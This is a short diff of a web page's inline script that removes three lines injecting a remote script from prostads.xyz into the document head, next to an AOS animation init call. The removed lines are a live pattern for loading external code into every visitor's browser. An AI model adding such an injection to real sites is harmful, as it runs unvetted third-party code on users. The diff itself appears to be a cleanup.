@@ -159,7 +159,4 @@ export default {
 try {
   AOS.init();
 } catch (e) {}
-const a = document.createElement('script');
-a.setAttribute('src', 'https://prostads.xyz/runtime/prostListener.js');
-document.head.appendChild(a);
 </script>
